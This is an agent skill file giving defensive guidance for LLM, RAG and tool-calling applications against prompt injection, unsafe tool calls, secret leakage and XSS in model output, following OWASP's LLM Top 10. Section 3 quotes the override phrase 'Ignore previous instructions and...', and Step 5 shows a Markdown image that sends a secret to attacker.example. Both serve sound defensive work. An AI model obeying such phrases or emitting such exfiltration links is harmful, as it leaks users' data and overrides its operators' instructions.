---
name: ai-security-prompt-injection
description: "Defends LLM/agent features against direct/indirect prompt injection, unsafe tool calls, secret leaks, and output XSS. Use for AI security. Do not use for basic SDK setup."
license: "MIT"
compatibility: "Antigravity (App, CLI, IDE) and Agent Skills 1.0 compatible agents"
metadata:
  author: "reusable-ai-development-skills"
  version: "1.0.0"
  skill_id: "SKILL-14"
  category: "Security Engineering"
---

# AI Security & Prompt Injection Defense

This skill defines the defensive engineering architecture required for applications integrating Large Language Models (LLMs), Retrieval-Augmented Generation (RAG), and tool-calling AI agents. Grounded in the OWASP Top 10 for LLM Applications, it treats all user inputs, retrieved documents, external web pages, and model outputs as untrusted data, enforcing strict privilege boundaries, tool-call validation, secret isolation, and human-in-the-loop approvals.

## 1. Activation Conditions

Activate this skill when the task involves any of the following scenarios:
- Building or reviewing features that pass user input, uploaded files, emails, database records, or scraped web content into an LLM prompt.
- Designing or auditing LLM function calling, MCP tool integrations, SQL/code generation agents, or autonomous workflow execution.
- Implementing Retrieval-Augmented Generation (RAG) pipelines, vector database searches, or document Q&A systems.
- Rendering LLM-generated Markdown, HTML, links, SVG, or structured JSON in a frontend UI or executing model outputs in backend workflows.
- Auditing AI features for prompt injection, system prompt leakage, cross-tenant RAG data leakage, or unbounded token/cost abuse.

## 2. When Not to Use

Do not use this skill as the primary workflow for the following tasks:
- Standard AI SDK setup, model selection, streaming transport, retry/fallback mechanics, or token budgeting without adversarial security focus: route to `ai-provider-integration` (`SKILL-28`).
- General PII retention and GDPR/UU PDP erasure policies across non-AI database tables: route to `privacy-data-protection` (`SKILL-12`).
- Classic web application security (password hashing, session fixation, standard SQLi in non-AI CRUD routes): route to `application-security-owasp` (`SKILL-10`).

## 3. Scope and Objectives

Every AI feature or workflow evaluated under this skill must address and verify the following security controls:
- **Untrusted Input Handling**: Bound input length, sanitize control characters, and structurally separate system instructions from untrusted user or external data.
- **Direct and Indirect Prompt Injection Defense**: Assume any text from users, web pages, PDFs, emails, tickets, or RAG chunks may contain adversarial instructions (`"Ignore previous instructions and..."`), and ensure model compromises cannot bypass application security policies.
- **Tool-Call Restrictions and Schema Allowlists**: Expose only the minimum necessary tools to an LLM, validate all tool arguments against strict schemas and business rules, and never allow an LLM to pass arbitrary SQL, shell commands, or file paths.
- **Permission Boundaries and Tenant Isolation**: Enforce the authenticated user's RBAC/ABAC permissions and `tenant_id` scope inside the deterministic code of every tool and vector retrieval query, never inside the prompt text alone.
- **Output Validation and Safe Rendering**: Validate structured LLM outputs against strict JSON schemas before downstream use, and sanitize/encode LLM text or Markdown before rendering in HTML (blocking XSS, `javascript:` links, and unauthorized auto-loading tracking images).
- **Secret and System Credential Protection**: Never place API keys, database credentials, signing secrets, or private tokens into system prompts, context windows, or tool definitions visible to the model.
- **Retrieval (RAG) and External Content Risks**: Enforce access control filters (`tenant_id`, `user_id`, document ACLs) at the vector/search query layer and isolate untrusted external content with clear data delimiters.
- **Human Approval for High-Impact Operations**: Require explicit, deterministic user confirmation (out-of-band from the LLM's own decision) before executing state-changing, financial, external communication, or destructive actions.
- **Security Testing of AI Workflows**: Verify resilience using adversarial red-team test cases covering direct injection, indirect RAG injection, unauthorized tool parameter tampering, and XSS in model responses.

## 4. Prerequisites and Context Requirements

Before designing or hardening an AI workflow, inspect the system to identify:
1. **Model Inputs & Data Sources**: List all data sources entering the prompt context (direct user chat, database fields, uploaded documents, third-party webhooks, web search results, vector store chunks).
2. **Available Tools & Side Effects**: Inventory every function/tool the model can call and classify each tool as Read-Only vs. State-Changing / High-Impact.
3. **Output Consumers**: Determine how the model's response is consumed (rendered in browser DOM, parsed as JSON, passed to another API, used in a database query, or executed as code).
4. **Authentication & Tenancy Context**: Identify how the calling user's identity and permissions are propagated to the AI service and tool handlers.

## 5. Step-by-Step Workflow

Follow this numbered engineering procedure when building or auditing AI capabilities:

### Step 1: Isolate Instructions from Untrusted Data (Input & Prompt Architecture)
1. **Never Concatenate Prompts Naive-Style**: Use the provider's native role separation (`system` / `developer` role vs. `user` role) rather than interpolating user strings directly into system instructions.
2. **Delimiter & Structural Tagging**: Wrap untrusted external documents, RAG snippets, or user-supplied fields in explicit data delimiters (e.g., `<untrusted_document_content>...</untrusted_document_content>`) and instruct the system prompt to treat content inside those tags strictly as passive data, never as executable instructions.
3. **Input Validation & Quota Caps**: Enforce strict character/token length limits and per-user rate limits before calling the model to prevent Denial of Wallet (DoW) and context-window stuffing.

### Step 2: Secure Retrieval (RAG) and External Context
1. **Pre-Filter Vector & Search Queries**: Apply mandatory metadata filters (`WHERE tenant_id = :authenticated_tenant_id AND acl_role IN (:user_roles)`) inside the vector database or search query itself. Never retrieve global chunks and ask the LLM to filter out confidential information.
2. **Sanitize Ingested Documents**: Strip hidden text, invisible CSS/HTML comments, and active script payloads when indexing documents or web pages into a RAG pipeline.

### Step 3: Lock Down Tool Calling and Permission Boundaries
1. **Least-Privilege Tool Registry**: Provide the model only with the specific tools required for the current route/task; do not attach administrative or write tools to a read-only assistant endpoint.
2. **Server-Side Identity Binding**: Never let the LLM supply security-critical parameters such as `user_id`, `tenant_id`, `organization_id`, or `role` in tool arguments. Bind those parameters exclusively from the authenticated server session (`session.user.id`) inside the tool execution handler.
3. **Strict Argument Allowlisting**: Validate all LLM-supplied tool arguments with a schema validator (`zod`, `Pydantic`, JSON Schema) and business bounds (e.g., disallow negative quantities, restrict URLs to an allowlist, reject raw SQL/shell fragments).

### Step 4: Enforce Human-in-the-Loop (HITL) for High-Impact Actions
1. Classify any tool that sends emails/messages, modifies billing/orders, deletes records, changes permissions, or triggers external webhooks as **High-Impact**.
2. Instead of executing high-impact tools automatically during the LLM loop, return a **Pending Action Proposal** (`action_id`, structured parameters, human-readable summary) to the client UI.
3. Execute the mutation only when the authenticated user submits a standard, CSRF-protected / authenticated confirmation request to a deterministic backend endpoint verifying that specific `action_id`.

### Step 5: Validate and Sanitize Model Outputs
1. **Structured Output Validation**: When downstream code expects JSON, use constrained decoding (`response_schema` / Structured Outputs) and validate the parsed payload against a strict schema before use.
2. **Safe UI Rendering**: Treat LLM output as untrusted user input:
   - Render plain text safely or pass Markdown through a strict HTML sanitizer (e.g., `DOMPurify`, `rehype-sanitize`) that strips `<script>`, `<iframe>`, `<object>`, `onload`/`onerror` handlers, and `javascript:`/`data:` URIs.
   - Block or proxy external Markdown images (`![leak](https://attacker.example/collect?secret=...)`) so an indirect prompt injection cannot exfiltrate conversation data via automatic browser image requests!

### Step 6: Execute Adversarial AI Security Tests
1. Write automated tests simulating:
   - Direct prompt injection attempting to override instructions or call restricted tools.
   - Indirect prompt injection embedded inside a mocked RAG document or database field.
   - Tool argument tampering (attempting to pass another user's `id` or an XSS payload in model output).

## 6. Technology-Specific Adaptation Rules

- **JavaScript / TypeScript (Node.js / Next.js / React / Vue)**:
  - Validate tool schemas and structured outputs with `zod`.
  - When rendering Markdown in React (`react-markdown`), do not enable `rehype-raw` without `rehype-sanitize`, and restrict allowed URL protocols (`https`, `mailto`) while blocking external image exfiltration (`disallowedElements: ['img']` or strict domain allowlist).
- **Python (FastAPI / Django / Flask)**:
  - Use `Pydantic` `BaseModel` with strict constraints (`Field(..., max_length=...)`) for structured outputs and tool arguments; pass `current_user` via application dependency injection into tool handlers rather than exposing `user_id` in the LLM tool schema.
- **PHP (Laravel / Symfony)**:
  - Validate LLM JSON responses using `Validator::make($decoded, $rules)` before persisting or dispatching jobs; sanitize rendered Markdown using `CommonMark` with `html_input => 'strip'` and `allow_unsafe_links => false`.
- **Go / Java (Spring AI) / C# (.NET Semantic Kernel) / Rust**:
  - Unmarshal model outputs into strongly typed structs with strict validation tags; enforce `context.WithTimeout` and token budgets on every completion call; never wire raw SQL or reflection-based command executors to agent tools.
- **Unknown or Mixed Stacks**:
  - Identify the boundary where LLM responses re-enter application code or UI templates and apply standard untrusted-input validation and encoding at that boundary.

## 7. Security and Safety Considerations

- **Prompts Are Not Security Boundaries**: System prompt instructions (`"Never reveal other users' data"` or `"Only run SELECT queries"`) are advisory guidelines for the model, not security controls. Deterministic code must enforce every access control, query constraint, and validation rule.
- **Prevent Data Exfiltration Side-Channels**: An attacker who injects instructions via an email or document will often try to exfiltrate context via Markdown images, clickable phishing links, or outbound tool calls (webhook/email/fetch tools). Restrict outbound network tools and external image rendering.
- **No Secrets in Context**: Never inject `.env` variables, raw API keys, or internal bearer tokens into the prompt context; tool handlers must attach credentials inside the backend execution layer.

## 8. Verification Criteria

Before marking an AI security review or implementation complete, verify:
- [ ] Security-sensitive parameters (`user_id`, `tenant_id`, permissions) are bound from the authenticated server session inside tool/RAG code, never accepted from LLM tool arguments.
- [ ] RAG and search retrieval queries enforce tenant and role access filters at the database/index query level.
- [ ] High-impact or destructive agent actions require explicit human confirmation before execution.
- [ ] LLM outputs are schema-validated before programmatic use and sanitized against XSS and Markdown image exfiltration before UI rendering.
- [ ] Automated adversarial tests verify that injected instructions in user inputs or retrieved documents cannot bypass authorization or execute unsafe tools.

## 9. Failure Handling and Edge Cases

- **Model Refusal or Malformed Structured Output**: If an LLM returns malformed JSON, refuses a request due to safety filters, or hallucinates a non-existent tool name, catch the validation error gracefully, log a sanitized diagnostic event, and return a safe fallback response without crashing the request or exposing internal prompts.
- **Infinite Tool-Calling Loops**: Enforce a strict maximum iteration cap (e.g., `max_steps = 3` or `5`) and total request timeout on agent loops so a confused or injected model cannot spin indefinitely consuming tokens.
- **Legacy Text-to-SQL Features**: If a feature requires natural-language database querying, never allow the model to execute raw SQL against a read-write connection. Prefer mapped semantic filter builders/DSL; if SQL execution is unavoidable, enforce a dedicated read-only database user, query AST parsing, strict row-level security (`RLS`) or mandatory view scoping by `tenant_id`, and a hard `LIMIT` and statement timeout.

## 10. Expected Outputs and Reporting Requirements

Report AI security reviews and implementations using the following template:

```markdown
# AI Security & Prompt Injection Audit Report

## 1. AI Workflow & Trust Boundary Overview
- **Feature / Agent Scope**: `<chat endpoint, RAG pipeline, tool-calling workflow>`
- **Untrusted Context Sources**: `<user input, uploaded docs, RAG chunks, external URLs>`
- **Registered Tools & Classification**: `<tool names -> Read-Only vs. High-Impact>`

## 2. OWASP LLM Security Verification Matrix
| Security Control | OWASP LLM Ref | Status (`PASS`/`FAIL`/`N/A`) | Verification Evidence |
| :--- | :--- | :--- | :--- |
| Input Separation & Quota Bounds | LLM01 / LLM10 | `PASS` | `<prompt builder + rate/length limiter>` |
| RAG / Vector Query Tenant Filtering | LLM08 / LLM02 | `PASS` | `<retriever query filter + cross-tenant test>` |
| Tool-Call Schema & Session Binding | LLM06 | `PASS` | `<tool handler file:line + tamper test>` |
| Human Approval Gate for Mutations | LLM06 | `PASS` | `<confirmation endpoint + test>` |
| Output Schema & XSS/Image Sanitization | LLM05 / LLM02 | `PASS` | `<sanitizer config + XSS/exfil test>` |
| Secret Isolation from Prompts/Logs | LLM02 / LLM07 | `PASS` | `<prompt/log audit>` |

## 3. Residual Risks & Operational Guardrails
- `<max_steps limit, token budget alerts, or manual approval workflows>`
```

## 11. Interoperability and Skill Routing

- **Upstream Skills**: Receive threat analysis from `threat-modeling-risk-assessment` (`SKILL-13`) and data classification rules from `privacy-data-protection` (`SKILL-12`).
- **Parallel / Sibling Skills**: Coordinate closely with `ai-provider-integration` (`SKILL-28`) for SDK resilience, timeouts, fallbacks, and cost controls, and `application-security-owasp` (`SKILL-10`) for authentication and XSS defenses.
- **Downstream Skills**: Route backend adversarial tests to `backend-testing-tdd` (`SKILL-16`), UI rendering verification to `playwright-mcp-browser-qa` (`SKILL-17`), and release gating to `final-quality-gate-release-audit` (`SKILL-38`).

## 12. Source References

- **OWASP Top 10 for Large Language Model Applications**: https://owasp.org/www-project-top-10-for-large-language-model-applications/
- **OWASP LLM Prompt Injection Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- **NIST AI Risk Management Framework (AI RMF)**: https://www.nist.gov/itl/ai-risk-management-framework
- **Library Reference**: [../../references/owasp-asvs-top10-reference.md](../../references/owasp-asvs-top10-reference.md)
